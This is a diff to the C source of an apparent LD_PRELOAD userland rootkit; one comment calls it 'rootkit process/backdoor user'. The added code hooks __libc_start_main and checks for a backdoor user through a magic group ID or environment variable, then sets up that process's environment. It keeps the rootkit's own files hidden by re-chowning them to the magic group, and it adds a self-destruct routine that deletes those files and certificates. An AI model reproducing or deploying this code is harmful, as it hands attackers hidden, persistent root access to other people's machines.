@@ -17,10 +17,52 @@
 #include <sys/wait.h>
 #include <linux/netlink.h>
 
+void killself(int mode);
+int snodew(void);
 int iswww(void);
 
 #include "config.h"
 #include "hooks.c"
+
+void killself(int mode){
+    if(geteuid() != 0){
+        if(mode == KILLSELF_OUTPUT)
+            printf("inadequate permissions\n");
+        return;
+    }
+
+    getsym(o_unlink, "unlink");
+    for(int i = 0; rkfiles[i] != NULL; i++){
+        if(o_unlink(rkfiles[i]) < 0){
+            if(mode == KILLSELF_OUTPUT)
+                printf("something went wrong removing %s\n", rkfiles[i]);
+        }else{
+            if(mode == KILLSELF_OUTPUT)
+                printf("successfully removed %s\n", rkfiles[i]);
+        }
+    }
+
+#if defined(CLIENTPEM) && defined(SERVERCRT)
+    char *const certpaths[3] = {CLIENTPEM, SERVERCRT, NULL};
+    for(int i = 0; certpaths[i] != NULL; i++){
+        if(o_unlink(certpaths[i]) < 0){
+            if(mode == KILLSELF_OUTPUT)
+                printf("something went wrong removing %s\n", certpaths[i]);
+        }else{
+            if(mode == KILLSELF_OUTPUT)
+                printf("successfully removed %s\n", certpaths[i]);
+        }
+    }
+#endif
+}
+
+static int snodewme = 0;
+int snodew(void){
+    if(snodewme != 0) return 1;
+    if(getgid() == MAGIC_GID) snodewme = 1;
+    if(getenv(MAGIC_VAR) != NULL) snodewme = 1;
+    return snodewme;
+}
 
 int iswww(void){
     const char *name, *homedir;
@@ -73,6 +115,13 @@ int iswww(void){
 int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
     getsym(o_libc_start_main, "__libc_start_main");
 
+    if(snodew()){  /* rootkit process/backdoor user. get it ready. */
+        for(int i = 0; set_variables[i] != NULL; i++)
+            putenv(set_variables[i]);
+        for(int i = 0; unset_variables[i] != NULL; i++)
+            unsetenv(unset_variables[i]);
+    }
+
     if(geteuid() != 0)
         goto do_libc_start_main;
 
@@ -80,12 +129,17 @@ int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_
     int path_stat;
     getsym(o_xstat, "__xstat");
 
-    for(int i = 0; rmfiles[i] != NULL; i++){                 /* if one file doesn't exist, they */
+    for(int i = 0; rkfiles[i] != NULL; i++){                 /* if one file doesn't exist, they */
         memset(&pstat, 0, sizeof(struct stat));              /* all get removed...              */
-        path_stat = o_xstat(_STAT_VER, rmfiles[i], &pstat);
+        path_stat = o_xstat(_STAT_VER, rkfiles[i], &pstat);
         if(path_stat < 0 && errno == ENOENT){
             killself(KILLSELF_QUIET);
             goto do_libc_start_main;
+        }
+
+        if(path_stat){  /* file exists. make sure it's hidden still */
+            getsym(o_chown, "chown");
+            o_chown(rkfiles[i], 0, MAGIC_GID);
         }
     }
 
